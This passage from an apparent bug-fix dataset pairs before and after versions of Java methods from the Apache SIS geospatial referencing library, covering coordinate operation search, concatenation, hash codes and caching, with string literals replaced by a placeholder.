 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException exception) {
    log(exception);
    return null;
  }
catch (  MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      try {
        candidate=it.next();
      }
 catch (      BackingStoreException exception) {
        throw exception.unwrapOrRethrow(FactoryException.class);
      }
      if (inverse)       try {
        candidate=inverse(candidate);
      }
 catch (      NoninvertibleTransformException exception) {
        Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
        continue;
      }
    }
 catch (    MissingFactoryResourceException e) {
      log(e);
      continue;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}","/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
private CoordinateOperation search(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws IllegalArgumentException, ConversionException, FactoryException {
  final String sourceID=findCode(sourceCRS);
  if (sourceID == null) {
    return null;
  }
  final String targetID=findCode(targetCRS);
  if (targetID == null) {
    return null;
  }
  if (sourceID.equals(targetID)) {
    return null;
  }
  final boolean inverse;
  Set<CoordinateOperation> operations;
  try {
    operations=registry.createFromCoordinateReferenceSystemCodes(sourceID,targetID);
    inverse=Containers.isNullOrEmpty(operations);
    if (inverse) {
      operations=registry.createFromCoordinateReferenceSystemCodes(targetID,sourceID);
      if (Containers.isNullOrEmpty(operations)) {
        return null;
      }
    }
  }
 catch (  NoSuchAuthorityCodeException exception) {
    log(exception);
    return null;
  }
catch (  MissingFactoryResourceException exception) {
    log(exception);
    return null;
  }
  double largestArea=0;
  double finestAccuracy=Double.POSITIVE_INFINITY;
  CoordinateOperation bestChoice=null;
  boolean stopAtFirstDeprecated=false;
  for (final Iterator<CoordinateOperation> it=operations.iterator(); it.hasNext(); ) {
    CoordinateOperation candidate;
    try {
      candidate=it.next();
    }
 catch (    BackingStoreException exception) {
      FactoryException cause=exception.unwrapOrRethrow(FactoryException.class);
      if (cause instanceof MissingFactoryResourceException) {
        log(cause);
        continue;
      }
      throw cause;
    }
    if (candidate != null) {
      final boolean isDeprecated=(candidate instanceof Deprecable) && ((Deprecable)candidate).isDeprecated();
      if (isDeprecated && stopAtFirstDeprecated) {
        break;
      }
      final double area=Extents.area(Extents.intersection(Extents.getGeographicBoundingBox(areaOfInterest),Extents.getGeographicBoundingBox(candidate.getDomainOfValidity())));
      if (bestChoice == null || area >= largestArea) {
        final double accuracy=CRS.getLinearAccuracy(candidate);
        if (bestChoice == null || area != largestArea || accuracy < finestAccuracy) {
          if (inverse)           try {
            candidate=inverse(candidate);
          }
 catch (          NoninvertibleTransformException exception) {
            Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationRegistry.class,""String_Node_Str"",exception);
            continue;
          }
catch (          MissingFactoryResourceException e) {
            log(e);
            continue;
          }
          candidate=complete(candidate,sourceCRS,targetCRS);
          if (filter == null || filter.test(candidate)) {
            bestChoice=candidate;
            if (!Double.isNaN(area)) {
              largestArea=area;
            }
            finestAccuracy=Double.isNaN(accuracy) ? Double.POSITIVE_INFINITY : accuracy;
            stopAtFirstDeprecated=!isDeprecated;
          }
        }
      }
    }
  }
  return bestChoice;
}"
91877,"/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<CoordinateOperation>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),coordinateOperationAccuracy == null);
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new SingleOperation[flattened.size()]));
}","/** 
 * Invoked by JAXB for setting the operations.
 */
private void setSteps(final CoordinateOperation[] steps) throws FactoryException {
  final List<CoordinateOperation> flattened=new ArrayList<CoordinateOperation>(steps.length);
  initialize(null,steps,flattened,DefaultFactories.forBuildin(MathTransformFactory.class),(coordinateOperationAccuracy == null),(domainOfValidity == null));
  operations=UnmodifiableArrayList.wrap(flattened.toArray(new SingleOperation[flattened.size()]));
}"
91878,"/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation)) {
      if (coordinateOperationAccuracy == null) {
        setAccuracy=(PositionalAccuracyConstant.getLinearAccuracy(op) > 0);
        if (setAccuracy) {
          coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
        }
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
  }
}","/** 
 * Performs the part of   {@code DefaultConcatenatedOperations} construction that requires an iteration overthe sequence of coordinate operations. This method performs the following processing: <ul> <li>Verify the validity of the  {@code operations} argument.</li><li>Add the single operations in the  {@code flattened} array.</li><li>Set the  {@link #transform} field to the concatenated transform.</li><li>Set the  {@link #coordinateOperationAccuracy} field, but only if {@code setAccuracy} is {@code true}.</li> </ul> This method invokes itself recursively if there is nested   {@code ConcatenatedOperation} instancesin the given list. This should not happen according ISO 19111 standard, but we try to be safe. <div class=""section"">How coordinate operation accuracy is determined</div> If  {@code setAccuracy} is {@code true}, then this method copies accuracy information found in the single  {@link Transformation} instance. This method ignores instances of other kinds for the following reason:some  {@link Conversion} instances declare an accuracy, which is typically close to zero. If a concatenatedoperation contains such conversion together with a transformation with unknown accuracy, then we do not want to declare ""0 meter"" as the concatenated operation accuracy; it would be a false information. An other reason is that a concatenated operation typically contains an arbitrary amount of conversions, but only one transformation. So considering only transformations usually means to pickup only one operation in the given  {@code operations} list, which make things clearer.<div class=""note""><b>Note:</b> according ISO 19111, the accuracy attribute is allowed only for transformations. However this restriction is not enforced everywhere. For example the EPSG database declares an accuracy of 0 meter for conversions, which is conceptually exact. In this class we are departing from strict interpretation of the specification since we are adding accuracy informations to a concatenated operation. This departure should be considered as a convenience feature only; accuracies are really relevant in transformations only.</div>
 * @param properties  The properties specified at construction time, or {@code null} if unknown.
 * @param operations  The operations to concatenate.
 * @param flattened   The destination list in which to add the {@code SingleOperation} instances.
 * @param mtFactory   The math transform factory to use, or {@code null} for not performing concatenation.
 * @param setAccuracy {@code true} for setting the {@link #coordinateOperationAccuracy} field.
 * @param setDomain   {@code true} for setting the {@link #domainOfValidity} field.
 * @throws FactoryException if the factory can not concatenate the math transforms.
 */
private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy,boolean setDomain) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy,setDomain);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation) && (PositionalAccuracyConstant.getLinearAccuracy(op) != 0)) {
      if (coordinateOperationAccuracy == null) {
        coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
    if (setDomain) {
      final Extent domain=op.getDomainOfValidity();
      if (domain != null) {
        if (domainOfValidity == null) {
          domainOfValidity=domain;
        }
 else         if (!domain.equals(domainOfValidity)) {
          domainOfValidity=null;
          setDomain=false;
        }
      }
    }
  }
}"
91879,"/** 
 * Returns the hash code value.
 */
@Override public int hashCode(){
  return sourceCRS.hashCode() * 31 + targetCRS.hashCode();
}","/** 
 * Returns the hash code value.
 */
@Override public int hashCode(){
  return Objects.hashCode(sourceCRS) * 31 + Objects.hashCode(targetCRS);
}"
91880,"/** 
 * Creates a new instance for the given factory and context.
 * @param registry  the factory to use for creating operations as defined by authority, or {@code null} if none.
 * @param factory   the factory to use for creating operations not found in the registry.
 * @param context   the area of interest and desired accuracy, or {@code null} if none.
 * @throws FactoryException if an error occurred while initializing this {@code CoordinateOperationFinder}.
 */
public CoordinateOperationFinder(final CoordinateOperationAuthorityFactory registry,final CoordinateOperationFactory factory,final CoordinateOperationContext context) throws FactoryException {
  super(registry,factory,context);
  identifierOfStepCRS=new HashMap<>(8);
  previousSearches=new HashMap<>(8);
}","/** 
 * Creates a new instance for the given factory and context.
 * @param registry  the factory to use for creating operations as defined by authority, or {@code null} if none.
 * @param factory   the factory to use for creating operations not found in the registry.
 * @param context   the area of interest and desired accuracy, or {@code null} if none.
 * @throws FactoryException if an error occurred while initializing this {@code CoordinateOperationFinder}.
 */
public CoordinateOperationFinder(final CoordinateOperationAuthorityFactory registry,final CoordinateOperationFactory factory,final CoordinateOperationContext context) throws FactoryException {
  super(registry,factory,context);
  identifierOfStepCRS=new HashMap<>(8);
  previousSearches=new HashMap<>(8);
  useCache=(context == null) && (factory == factorySIS);
}"
91881,"/** 
 * Infers an operation for conversion or transformation between two coordinate reference systems. If a non-null authority factory the <cite>registry</cite> has been specified at construction time, this method will first query that factory (<cite>late-binding</cite> approach see class javadoc). If no operation has been found in the registry or if no registry has been specified to the constructor, this method inspects the given CRS and delegates the work to one or many   {@code createOperationStep()}methods (<cite>early-binding</cite> approach). <p>At first, this method is invoked with the   {@code sourceCRS} and {@code targetCRS} arguments given to the{@link DefaultCoordinateOperationFactory#createOperation(CoordinateReferenceSystem,CoordinateReferenceSystem,CoordinateOperationContext) CoordinateOperationFactory.createOperation()} method. But then, this method maybe invoked recursively by some  {@code createOperationStep()} methods with different source or target CRS,for example in order to process the  {@linkplain org.apache.sis.referencing.crs.DefaultProjectedCRS#getBaseCRS() base geographic CRS} of a projected CRS.</p>
 * @param sourceCRS  input coordinate reference system.
 * @param targetCRS  output coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}.
 * @throws OperationNotFoundException if no operation path was found from {@code sourceCRS} to {@code targetCRS}.
 * @throws FactoryException if the operation creation failed for some other reason.
 */
@Override public CoordinateOperation createOperation(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws OperationNotFoundException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  if (!previousSearches.isEmpty()) {
  }
  final CRSPair key=new CRSPair(sourceCRS,targetCRS);
  if (previousSearches.put(key,Boolean.TRUE) != null) {
    throw new FactoryException(Errors.format(Errors.Keys.RecursiveCreateCallForCode_2,CoordinateOperation.class,key));
  }
  GeographicBoundingBox bbox=Extents.getGeographicBoundingBox(areaOfInterest);
  if (bbox == null) {
    bbox=Extents.intersection(CRS.getGeographicBoundingBox(sourceCRS),CRS.getGeographicBoundingBox(targetCRS));
    areaOfInterest=CoordinateOperationContext.setGeographicBoundingBox(areaOfInterest,bbox);
  }
  if (registry != null) {
    final CoordinateOperation op=super.createOperation(sourceCRS,targetCRS);
    if (op != null)     return op;
  }
  if (sourceCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS source=(GeneralDerivedCRS)sourceCRS;
    if (targetCRS instanceof GeneralDerivedCRS) {
      return createOperationStep(source,(GeneralDerivedCRS)targetCRS);
    }
    if (targetCRS instanceof SingleCRS) {
      return createOperationStep(source,(SingleCRS)targetCRS);
    }
  }
  if (targetCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS target=(GeneralDerivedCRS)targetCRS;
    if (sourceCRS instanceof SingleCRS) {
      return createOperationStep((SingleCRS)sourceCRS,target);
    }
  }
  if (sourceCRS instanceof GeodeticCRS) {
    final GeodeticCRS source=(GeodeticCRS)sourceCRS;
    if (targetCRS instanceof GeodeticCRS) {
      return createOperationStep(source,(GeodeticCRS)targetCRS);
    }
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof VerticalCRS) {
    final VerticalCRS source=(VerticalCRS)sourceCRS;
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof TemporalCRS) {
    final TemporalCRS source=(TemporalCRS)sourceCRS;
    if (targetCRS instanceof TemporalCRS) {
      return createOperationStep(source,(TemporalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof CompoundCRS || targetCRS instanceof CompoundCRS) {
    return createOperationStep(sourceCRS,CRS.getSingleComponents(sourceCRS),targetCRS,CRS.getSingleComponents(targetCRS));
  }
  throw new OperationNotFoundException(notFoundMessage(sourceCRS,targetCRS));
}","/** 
 * Infers an operation for conversion or transformation between two coordinate reference systems. If a non-null authority factory the <cite>registry</cite> has been specified at construction time, this method will first query that factory (<cite>late-binding</cite> approach see class javadoc). If no operation has been found in the registry or if no registry has been specified to the constructor, this method inspects the given CRS and delegates the work to one or many   {@code createOperationStep()}methods (<cite>early-binding</cite> approach). <p>At first, this method is invoked with the   {@code sourceCRS} and {@code targetCRS} arguments given to the{@link DefaultCoordinateOperationFactory#createOperation(CoordinateReferenceSystem,CoordinateReferenceSystem,CoordinateOperationContext) CoordinateOperationFactory.createOperation()} method. But then, this method maybe invoked recursively by some  {@code createOperationStep()} methods with different source or target CRS,for example in order to process the  {@linkplain org.apache.sis.referencing.crs.DefaultProjectedCRS#getBaseCRS() base geographic CRS} of a projected CRS.</p>
 * @param sourceCRS  input coordinate reference system.
 * @param targetCRS  output coordinate reference system.
 * @return a coordinate operation from {@code sourceCRS} to {@code targetCRS}.
 * @throws OperationNotFoundException if no operation path was found from {@code sourceCRS} to {@code targetCRS}.
 * @throws FactoryException if the operation creation failed for some other reason.
 */
@Override public CoordinateOperation createOperation(final CoordinateReferenceSystem sourceCRS,final CoordinateReferenceSystem targetCRS) throws OperationNotFoundException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  if (equalsIgnoreMetadata(sourceCRS,targetCRS))   try {
    return createFromAffineTransform(AXIS_CHANGES,sourceCRS,targetCRS,CoordinateSystems.swapAndScaleAxes(sourceCRS.getCoordinateSystem(),targetCRS.getCoordinateSystem()));
  }
 catch (  IllegalArgumentException|ConversionException e) {
    throw new FactoryException(Errors.format(Errors.Keys.CanNotInstantiate_1,new CRSPair(sourceCRS,targetCRS)),e);
  }
  final CRSPair key=new CRSPair(sourceCRS,targetCRS);
  if (useCache && !previousSearches.isEmpty()) {
    final CoordinateOperation op=factorySIS.cache.peek(key);
    if (op != null)     return op;
  }
  if (previousSearches.put(key,Boolean.TRUE) != null) {
    throw new FactoryException(Errors.format(Errors.Keys.RecursiveCreateCallForCode_2,CoordinateOperation.class,key));
  }
  GeographicBoundingBox bbox=Extents.getGeographicBoundingBox(areaOfInterest);
  if (bbox == null) {
    bbox=Extents.intersection(CRS.getGeographicBoundingBox(sourceCRS),CRS.getGeographicBoundingBox(targetCRS));
    areaOfInterest=CoordinateOperationContext.setGeographicBoundingBox(areaOfInterest,bbox);
  }
  if (registry != null) {
    final CoordinateOperation op=super.createOperation(sourceCRS,targetCRS);
    if (op != null)     return op;
  }
  if (sourceCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS source=(GeneralDerivedCRS)sourceCRS;
    if (targetCRS instanceof GeneralDerivedCRS) {
      return createOperationStep(source,(GeneralDerivedCRS)targetCRS);
    }
    if (targetCRS instanceof SingleCRS) {
      return createOperationStep(source,(SingleCRS)targetCRS);
    }
  }
  if (targetCRS instanceof GeneralDerivedCRS) {
    final GeneralDerivedCRS target=(GeneralDerivedCRS)targetCRS;
    if (sourceCRS instanceof SingleCRS) {
      return createOperationStep((SingleCRS)sourceCRS,target);
    }
  }
  if (sourceCRS instanceof GeodeticCRS) {
    final GeodeticCRS source=(GeodeticCRS)sourceCRS;
    if (targetCRS instanceof GeodeticCRS) {
      return createOperationStep(source,(GeodeticCRS)targetCRS);
    }
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof VerticalCRS) {
    final VerticalCRS source=(VerticalCRS)sourceCRS;
    if (targetCRS instanceof VerticalCRS) {
      return createOperationStep(source,(VerticalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof TemporalCRS) {
    final TemporalCRS source=(TemporalCRS)sourceCRS;
    if (targetCRS instanceof TemporalCRS) {
      return createOperationStep(source,(TemporalCRS)targetCRS);
    }
  }
  if (sourceCRS instanceof CompoundCRS || targetCRS instanceof CompoundCRS) {
    return createOperationStep(sourceCRS,CRS.getSingleComponents(sourceCRS),targetCRS,CRS.getSingleComponents(targetCRS));
  }
  throw new OperationNotFoundException(notFoundMessage(sourceCRS,targetCRS));
}"
91882,"/** 
 * Constructs a factory with the given default properties.  {@code DefaultCoordinateOperationFactory} will fallback on the map given to this constructorfor any property not present in the map provided to a  {@code createFoo(Map<String,?>, )} method.
 * @param properties the default properties, or {@code null} if none.
 * @param factory the factory to use for creating{@linkplain org.apache.sis.referencing.operation.transform.AbstractMathTransform math transforms}, or   {@code null} for the default factory.
 */
public DefaultCoordinateOperationFactory(Map<String,?> properties,final MathTransformFactory factory){
  if (properties == null || properties.isEmpty()) {
    properties=Collections.emptyMap();
  }
 else {
    String key=null;
    Object value=null;
    properties=new HashMap<>(properties);
    try {
      crsFactory=(CRSFactory)(value=properties.remove(key=ReferencingServices.CRS_FACTORY));
      csFactory=(CSFactory)(value=properties.remove(key=ReferencingServices.CS_FACTORY));
      mtFactory=(MathTransformFactory)(value=properties.remove(key=ReferencingServices.MT_FACTORY));
    }
 catch (    ClassCastException e) {
      throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.IllegalPropertyValueClass_2,key,Classes.getClass(value)));
    }
    properties=CollectionsExt.compact(properties);
  }
  defaultProperties=properties;
  if (factory != null) {
    mtFactory=factory;
  }
  pool=new WeakHashSet<>(IdentifiedObject.class);
}","/** 
 * Constructs a factory with the given default properties.  {@code DefaultCoordinateOperationFactory} will fallback on the map given to this constructorfor any property not present in the map provided to a  {@code createFoo(Map<String,?>, )} method.
 * @param properties the default properties, or {@code null} if none.
 * @param factory the factory to use for creating{@linkplain org.apache.sis.referencing.operation.transform.AbstractMathTransform math transforms}, or   {@code null} for the default factory.
 */
public DefaultCoordinateOperationFactory(Map<String,?> properties,final MathTransformFactory factory){
  if (properties == null || properties.isEmpty()) {
    properties=Collections.emptyMap();
  }
 else {
    String key=null;
    Object value=null;
    properties=new HashMap<>(properties);
    try {
      crsFactory=(CRSFactory)(value=properties.remove(key=ReferencingServices.CRS_FACTORY));
      csFactory=(CSFactory)(value=properties.remove(key=ReferencingServices.CS_FACTORY));
      mtFactory=(MathTransformFactory)(value=properties.remove(key=ReferencingServices.MT_FACTORY));
    }
 catch (    ClassCastException e) {
      throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.IllegalPropertyValueClass_2,key,Classes.getClass(value)));
    }
    properties=CollectionsExt.compact(properties);
  }
  defaultProperties=properties;
  if (factory != null) {
    mtFactory=factory;
  }
  pool=new WeakHashSet<>(IdentifiedObject.class);
  cache=new Cache<>(12,50,true);
}"
91883,"/** 
 * Searches in given list of source components for an operation capable to convert or transform coordinates to the given target CRS. If no such operation can be found, then this method returns   {@code null}.
 * @param caller       the object which is inferring a coordinate operation.
 * @param sourceIsUsed flags for keeping trace of which source has been used.
 * @param sources      all components of the source CRS.
 * @param target       one component of the target CRS.
 * @return information about a coordinate operation from a source CRS to the given target CRS, or {@code null}.
 * @throws FactoryException if an error occurred while grabbing a coordinate operation.
 */
static SubOperationInfo create(final CoordinateOperationFinder caller,final boolean[] sourceIsUsed,final List<? extends SingleCRS> sources,final SingleCRS target) throws FactoryException {
  OperationNotFoundException failure=null;
  final Class<?> targetType=type(target);
  for (  final Class<?>[] sourceTypes : COMPATIBLE_TYPES) {
    if (sourceTypes[0].isAssignableFrom(targetType)) {
      int startAtDimension;
      int endAtDimension=0;
      for (      final Class<?> sourceType : sourceTypes) {
        for (int i=0; i < sourceIsUsed.length; i++) {
          final SingleCRS source=sources.get(i);
          startAtDimension=endAtDimension;
          endAtDimension+=source.getCoordinateSystem().getDimension();
          if (!sourceIsUsed[i] && sourceType.isAssignableFrom(type(source))) {
            final CoordinateOperation operation;
            try {
              operation=caller.createOperation(source,target);
            }
 catch (            OperationNotFoundException exception) {
              if (failure == null) {
                failure=exception;
              }
 else {
                failure.addSuppressed(exception);
              }
              continue;
            }
            sourceIsUsed[i]=true;
            if (failure != null) {
              Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationFinder.class,""String_Node_Str"",failure);
            }
            return new SubOperationInfo(operation,startAtDimension,endAtDimension);
          }
        }
      }
    }
  }
  if (failure != null) {
    throw failure;
  }
  return null;
}","/** 
 * Searches in given list of source components for an operation capable to convert or transform coordinates to the given target CRS. If no such operation can be found, then this method returns   {@code null}.
 * @param caller       the object which is inferring a coordinate operation.
 * @param sourceIsUsed flags for keeping trace of which source has been used.
 * @param sources      all components of the source CRS.
 * @param target       one component of the target CRS.
 * @return information about a coordinate operation from a source CRS to the given target CRS, or {@code null}.
 * @throws FactoryException if an error occurred while grabbing a coordinate operation.
 */
static SubOperationInfo create(final CoordinateOperationFinder caller,final boolean[] sourceIsUsed,final List<? extends SingleCRS> sources,final SingleCRS target) throws FactoryException {
  OperationNotFoundException failure=null;
  final Class<?> targetType=type(target);
  for (  final Class<?>[] sourceTypes : COMPATIBLE_TYPES) {
    if (sourceTypes[0].isAssignableFrom(targetType)) {
      for (      final Class<?> sourceType : sourceTypes) {
        int startAtDimension;
        int endAtDimension=0;
        for (int i=0; i < sourceIsUsed.length; i++) {
          final SingleCRS source=sources.get(i);
          startAtDimension=endAtDimension;
          endAtDimension+=source.getCoordinateSystem().getDimension();
          if (!sourceIsUsed[i] && sourceType.isAssignableFrom(type(source))) {
            final CoordinateOperation operation;
            try {
              operation=caller.createOperation(source,target);
            }
 catch (            OperationNotFoundException exception) {
              if (failure == null) {
                failure=exception;
              }
 else {
                failure.addSuppressed(exception);
              }
              continue;
            }
            sourceIsUsed[i]=true;
            if (failure != null) {
              Logging.recoverableException(Logging.getLogger(Loggers.COORDINATE_OPERATION),CoordinateOperationFinder.class,""String_Node_Str"",failure);
            }
            return new SubOperationInfo(operation,startAtDimension,endAtDimension);
          }
        }
      }
    }
  }
  if (failure != null) {
    throw failure;
  }
  return null;
}"
91884,"/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
 * @param sourceCRS  source coordinate reference system.
 * @param targetCRS  target coordinate reference system.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null} if no such operation is explicitly defined in the underlying database.
 * @return A coordinate operation from {@code sourceCRS} to {@code targetCRS}, or   {@code null}if no such operation is explicitly defined in the underlying database.
 * @throws IllegalArgumentException if the coordinate systems are not of the same type or axes do not match.
 * @throws ConversionException if the units are not compatible or a unit conversion is non-linear.
 * @throws FactoryException if an error occurred while creating the operation.
 */
